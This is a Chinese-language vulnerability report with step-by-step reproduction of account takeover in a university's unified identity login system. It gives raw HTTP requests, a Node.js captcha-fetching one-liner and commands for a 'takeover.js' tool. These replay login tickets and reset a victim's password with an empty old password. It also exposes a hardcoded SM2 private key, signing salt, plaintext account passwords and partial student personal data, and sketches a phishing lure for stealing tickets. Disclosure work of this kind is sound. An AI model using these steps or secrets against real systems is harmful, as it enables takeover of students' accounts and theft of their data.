

# xxxx统一身份认证ids.xxx.edu.cn存在逻辑缺陷漏洞，登录票据重放致任意用户账号，以无二次验证直接修改账户密码，任意用户账号接管漏洞


## 漏洞描述
统一身份认证登录成功后，服务端签发名为 COMBSTR 的登录票据，并通过 GET 参数在连续三次跳转的 URL 中传递：/cas/webApi/login/loginAction?combStr=xxx → /cas/login?combStr=xxx → /cas/WEB/index.html?combStr=xxx。票据为 SM2 加密串，前端 JS 内置私钥即可解密，明文包含服务器会话 ID、用户内部 ID（userId）、学号。票据经 URL 传递意味着浏览器历史、服务器与中间设备访问日志、Referer 都是结构性的泄露面。

缺陷一：票据窗口期内未做一次性失效。将同一张已消费票据在两个完全独立的全新会话中先后提交 loginAction，均走通 302 跳转链建立有效登录态，并能以票据对应账号身份调用需认证接口返回真实个人数据（双账号 A/B 实证，见复现步骤）。

缺陷二：修改密码接口是否校验旧密码由客户端参数 isCheckOldPwd 决定。传 1 时服务端校验旧密码（错误旧密码返回 8000）；传 2 且 OLD_PWD 为空时直接返回 1000 修改成功。该开关客户端可控，服务端未按会话状态强制。

服务端对 changePwd 存在会话归属校验（会话身份必须等于请求体 USER_ID，跨用户直接改密返回 9001，已实测排除）；因此完整接管路径为：获取受害者一枚票据 → 全新会话重放票据换取受害者登录态 → 在该会话内以空旧密码修改密码 → 受害者原密码立即失效（REST 验证 400 凭证无效），账号被持久接管。

支撑因素：前端 JS 硬编码 SM2 响应解密私钥（9f94aee3a6e299a67da4eb9c520bb5b94e3138f6a662ac873d1d5362dc8330fc）与签名盐（www.xxxdu.tech），可伪造通过服务端验签的任意请求并解密全部加密响应；服务端 CORS 配置反射任意 Origin 并允许携带凭据（Access-Control-Allow-Origin: https://evil-example.com + Access-Control-Allow-Credentials: true）。


## 复现步骤
### Step 1：受害者正常登录，取得 COMBSTR 票据

账号 xxxxxx110447 在 https://ids.xxx.edu.cn/cas/login 正常登录。登录成功瞬间地址栏经过 /cas/WEB/index.html?combStr=xxxx，复制 combStr 参数即得 849 字符票据。

![](Pasted%20image%2020260928220137.png)

登录响应（SM2 加密）解密后票据明文关键节选：

{"data":1790482304684,"LOGIN_TYPE":"WEB账号密码登录","service":"http://ids.xxx.edu.cn/IdentityAuthentication/a/cas","loginName":"241123110447","JSESSIONID":"20C0BC18925D2B976777CAF96F8AB35","userId":"1b0d743832a04802a5945882b4814da5"}

结果: 票据明文即含服务器会话 ID 与用户标识，属于可直接使用的会话凭证，且其流转全程在 URL 中。



#### 提取验证码（保存至 cap_b2.png，会话存 jar_Blogin2.json）







node -e "(async()=>{const https=require('https');const fs=require('fs');let JAR={};

const r=await new Promise((res)=>{const q=https.request({host:'ids.guc.edu.cn',port:443,

path:'/cas/captcha.jpg?nc='+Date.now(),method:'GET',

headers:{'Host':'ids.guc.edu.cn','User-Agent':'Mozilla/5.0','Connection':'close'},

rejectUnauthorized:false},(rs)=>{(rs.headers['set-cookie']||[]).forEach(c=>{const kv=c.split(';')[0];

const i=kv.indexOf('=');JAR[kv.slice(0,i).trim()]=kv.slice(i+1);});const ch=[];

rs.on('data',c=>ch.push(c));rs.on('end',()=>res({body:Buffer.concat(ch)}));});

q.on('error',()=>res(null));q.end();});

fs.writeFileSync('cap_b2.png',r.body);

fs.writeFileSync('jar_Blogin2.json',JSON.stringify(JAR));console.log('fetched');})();"

![](Pasted%20image%2020260928220222.png)






### Step 2：全新会话重放受害者票据，换取其登录态

在一个从未登录、无任何 Cookie 的全新会话中，携带 Referer 头（正常登录流程同站跳转自带）GET 访问：

GET /cas/webApi/login/loginAction?combStr=0000000610e9yJkYXRhIjoxNzkwNDgyMzA0Njg0LCJMT0dJTkdfVFlQRSI6IldFQl%2F...（共849字符）...dXNlcklkIjoiMWIwZDc0MzgzMmEwNDgwMmE1OTQ1ODgyYjQ4MTRkYTUifQ%3D%3D HTTP/1.1  
Host: ids.guc.edu.cn  
Referer: https://ids.xxx.edu.cn/cas/WEB/index.html  
Connection: close

结果: 302 跳转链依次经过 /cas/login?combStr=<新票据> 与 /cas/WEB/index.html?combStr=<新票据>&service=...，走完后会话持有 JSESSIONID、TGC、jeeplus.session.id 等 Cookie，受害者登录态建立。该票据在首次消费后于第二独立会话再次提交仍走通（窗口期内可多会话重放）。

全新空会话重放票据（核心步骤）

node takeover.js replay comb_B2.txt jar_VictimReplay.json

![](Pasted%20image%2020260928220253.png)

![](Pasted%20image%2020260928220309.png)






### Step 3：重放会话以受害者身份调用用户信息接口

在重放得到的会话中调用需认证接口（签名头算法与 SM2 私钥均在前端 JS 公开，可离线构造）：

POST /cas/webApi/config/userInfoByLoginName HTTP/1.1  
Host: ids.guc.edu.cn  
Cookie: JSESSIONID=...; TGC=...; jeeplus.session.id=...（重放会话Cookie）  
Content-Type: application/json  
casTicket: http://ids.xxx.edu.cn/IdentityAuthentication/a/cas  
eduRequestAuth: {"requestTime":"1790482688","requestId":"-1790482688-c1a930cf-38dd-4a39-98a7-80f2414abfe6","auth":"B02176CC6271B14A24BDFB3FC0EC16BB60679225C6F2079BE9154263BF127697D5765D7009D95F4C6EB691541973C3D3","requestPath":"/cas/webApi/config/userInfoByLoginName"}  
Connection: close  
  
{"data":"047da86732698de6d97156790fa24308fe10698f6ca7193073176337da9f8b1ec59da8046241bdef4fd79a2c6c9182f34d05ea4747f29b0a6d13ed01c4bba5bd45c63870cf5d0cac6fe60ce794ec10e2122b09d5733277271459fde82cdfbc5c444750cda8583901487ba658daa4635e2301819d0c47961fa89d0a01fe"}

结果: 返回 status=1000，解密为受害者真实信息：姓名xxx、学号 241123110xxx、邮箱 2595649xxx@qq.com、手机号 134xxxxxxxx、角色学生。该会话从未输入过该账号的密码或验证码。




**验证重放会话身份** **=** **受害者**

node takeover.js whoami jar_VictimReplay.json 241123110447

![](Pasted%20image%2020260928222346.png)

![](Pasted%20image%2020260928220441.png)






### Step 4：对照组一——攻击者会话直接跨用户改密被拒

用另一账号 xxx123110417（xxx）正常登录建会话后，直接向 changePwd 提交受害者的 USER_ID（isCheckOldPwd=2、空旧密码）：

结果: 返回 9001 无会话或已过期，同会话查询自身信息仍为 1000，证明服务端存在会话归属校验，跨用户直接改密不可行——接管必须经由 Step 2 的票据重放路径。这一对照同时说明漏洞定位在票据层而非参数层。



node takeover.js autologin xxx123110417 'Liu135709.' jar_Atk.json comb_A.txt






#### 自动重试最多6轮: OCR非4位纯数字时重取(不消耗次数); 提交后6000自动下一轮









node takeover.js sso jar_Atk.json comb_A.txt                # TGC建立即会话有效

node takeover.js whoami jar_Atk.json 241123110417           # 确认会话活着(1000)

node takeover.js changepwd jar_Atk.json 1b0d743832a04802a5945882b4814da5 'TmpTakeover1!' 2

![](Pasted%20image%2020260928220519.png)

![](Pasted%20image%2020260928220531.png)

![](Pasted%20image%2020260928220544.png)







### Step 5：对照组二——无票据全新会话被拒

在无任何票据的全新会话发送与 Step 3 完全相同的请求：

结果: 返回 9001。对比 Step 3 证明登录态完全来自票据重放。







echo {} > jar_empty.json

node takeover.js whoami jar_empty.json xxx123110447

![](Pasted%20image%2020260928220614.png)






### Step 6：重放会话内以空旧密码修改受害者密码

在重放会话中调用 changePwd，SM2 加密前明文参数为 USER_ID=1b0d743832a04802a5945882b4814da5（受害者）、OLD_PWD=""、NEW_PWD=TmpTakeover1!、isCheckOldPwd=2：

POST /cas/webApi/accountSecurity/changePwd HTTP/1.1  
Host: ids.guc.edu.cn  
Cookie: JSESSIONID=...; TGC=...; jeeplus.session.id=...（重放会话Cookie）  
Content-Type: application/json  
casTicket: http://ids.xxx.edu.cn/IdentityAuthentication/a/cas  
eduRequestAuth: {"requestTime":"...","requestId":"...","auth":"...","requestPath":"/cas/webApi/accountSecurity/changePwd"}  
Connection: close  
  
{"data":"04d5bec3c1c59cddd5b64c51671c4944...（SM2密文，明文见上）"}

结果: status=1000，解密响应 {"msg":"修改密码成功","status":true}。对照组：同一接口传 isCheckOldPwd=1 且旧密码错误返回 8000 原密码错误，证明旧密码校验逻辑存在但被客户端参数关闭。








node takeover.js changepwd jar_VictimReplay.json 1b0d743832a04802a5945882b4814da5 'TmpTakeover1!' 2

![](Pasted%20image%2020260928220805.png)






### Step 7：受害者原密码立即失效（接管终局证明）

改密成功后，立即用受害者原密码向 CAS REST 票证端点验证凭证：

POST /cas/v1/tickets HTTP/1.1  
Host: ids.xxx.edu.cn  
Content-Type: application/x-www-form-urlencoded  
Connection: close  
  
username=xxx123110447&password=xxx

结果: 改密前该请求返回 201（TGT 签发，凭证有效）；改密后同请求返回 400（1 errors, 0 successes，凭证无效）。受害者原密码已失效，账号完全由攻击者设定的新密码控制。

![](Pasted%20image%2020260928220842.png)

使用更改后的TmpTakeover1!密码进行登录

![](Pasted%20image%2020260928220900.png)

发现登录成功



node takeover.js restlogin xxx123110447 'xxxx'

![](Pasted%20image%2020260928220942.png)

(原密码已失效)

![](Pasted%20image%2020260928221102.png)

使用新密码成功登录

![](Pasted%20image%2020260928221130.png)






### Step 8：恢复受害者账号

在重放会话中再次以空旧密码将密码改回原值，随后重发 Step 7 请求返回 201（凭证恢复有效）。受害者账号已完全恢复原状。

node takeover.js changepwd jar_VictimReplay.json 1b0d743832a04802a5945882b4814da5 'Dhy13488949653Dhy.' 2

![](Pasted%20image%2020260928221155.png)






## 漏洞危害

1. 任意用户账号接管：获得目标用户一枚登录票据（URL 传递，浏览器历史/访问日志/Referer 均为泄露面）即可完成重放换会话、空旧密码改密、原密码失效的完整接管，双账号全链路实证。
2. 社工URL钓鱼：受害者登录后地址栏带着票，诱导其复制转发（“帮我看看这个链接打不开”）——攻击者从文本里提取 849 字符即得。本质是钓鱼，依赖受害者配合。

3. 影响全校账号：该系统为全校统一身份认证，单点登录接入 54 个业务系统，任一账号被接管后可经 SSO 进入教务、学工、一卡通、支付等系统。

4. 接管不可逆夺回：改密后受害者原密码立即失效（REST 验证 400），且旧密码校验可被跳过，受害者无法凭原密码找回。

5. 防护体系失效叠加：前端硬编码 SM2 私钥与签名盐使加密与验签层可被任意客户端复现；CORS 反射任意 Origin 并允许凭据。



































































































































































